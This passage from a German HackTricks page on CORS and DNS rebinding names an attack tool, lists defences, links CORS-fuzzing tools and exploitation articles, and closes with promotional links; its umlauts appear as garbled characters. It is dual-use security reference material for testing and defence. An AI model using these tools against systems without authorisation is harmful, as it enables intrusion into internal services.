[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) ist ein Tool zur Durchf√ºhrung von [DNS-Rebinding](https://en.wikipedia.org/wiki/DNS\_rebinding)-Angriffen. Es enth√§lt die erforderlichen Komponenten, um die IP-Adresse des Angriffsservers-DNS-Namens auf die IP-Adresse der Zielmaschine zur√ºckzubinden und Angriffspayloads bereitzustellen, um anf√§llige Software auf der Zielmaschine auszunutzen.

### Echter Schutz gegen DNS-Rebinding

* Verwenden Sie TLS in internen Diensten
* Fordern Sie Authentifizierung an, um auf Daten zuzugreifen
* Validieren Sie den Host-Header
* [https://wicg.github.io/private-network-access/](https://wicg.github.io/private-network-access/): Vorschlag, immer eine Vorab-Anfrage zu senden, wenn √∂ffentliche Server auf interne Server zugreifen m√∂chten

## **Tools**

**Fuzz m√∂gliche Fehlkonfigurationen in CORS-Richtlinien**

* [https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8](https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8)
* [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)
* [https://github.com/lc/theftfuzzer](https://github.com/lc/theftfuzzer)
* [https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)
* [https://github.com/Shivangx01b/CorsMe](https://github.com/Shivangx01b/CorsMe)
* [https://github.com/omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne)

## Referenzen

* [https://portswigger.net/web-security/cors](https://portswigger.net/web-security/cors)
* [https://portswigger.net/web-security/cors/access-control-allow-origin](https://portswigger.net/web-security/cors/access-control-allow-origin)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS)
* [https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [https://www.codecademy.com/articles/what-is-cors](https://www.codecademy.com/articles/what-is-cors)
* [https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors](https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors)
* [https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646](https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
* [https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b](https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>
